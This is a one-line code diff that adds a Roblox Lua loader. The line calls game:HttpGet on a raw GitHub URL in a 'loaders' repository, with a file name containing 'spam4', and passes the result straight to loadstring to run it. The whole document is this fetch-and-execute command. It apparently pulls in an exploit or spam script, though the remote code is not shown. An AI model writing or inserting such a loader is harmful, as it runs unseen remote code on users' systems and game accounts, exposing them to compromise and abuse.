@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/cure-violence-district-spam4-85kk7dsfeeb573.lua"))()
